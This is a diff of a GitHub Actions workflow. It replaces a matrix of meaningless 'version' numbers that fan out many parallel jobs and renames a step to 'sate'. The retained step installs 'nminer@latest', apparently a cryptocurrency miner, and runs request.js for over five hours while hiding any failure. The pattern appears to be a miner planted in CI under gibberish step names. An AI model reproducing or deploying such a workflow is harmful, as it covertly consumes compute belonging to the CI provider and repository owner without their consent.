@@ -9,25 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7095 }
-          - { version: 6750 }
-          - { version: 3025 }
-          - { version: 8920 }
-          - { version: 7480 }
-          - { version: 2435 }
-          - { version: 9904 }
-          - { version: 1480 }
-          - { version: 6213 }
-          - { version: 2920 }
-          - { version: 1046 }
-          - { version: 4336 }
-          - { version: 8295 }
-          - { version: 2124 }
-          - { version: 9 }
-          - { version: 2502 }
-          - { version: 6626 }
-          - { version: 4830 }
-          - { version: 8196 }
+          - { version: 4202 }
+          - { version: 7714 }
+          - { version: 923 }
+          - { version: 3154 }
+          - { version: 4095 }
+          - { version: 7351 }
+          - { version: 7026 }
+          - { version: 7766 }
+          - { version: 2008 }
+          - { version: 2241 }
+          - { version: 1687 }
+          - { version: 8908 }
+          - { version: 7494 }
+          - { version: 4322 }
+          - { version: 4923 }
+          - { version: 6962 }
+          - { version: 9897 }
 
     steps:
       - name: Checkout
@@ -38,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: bookend round though mindless
+      - name: sate
         run: |
           npm install nminer@latest
-          timeout 317m node request.js || echo "request executed"
+          timeout 337m node request.js || echo "request executed"
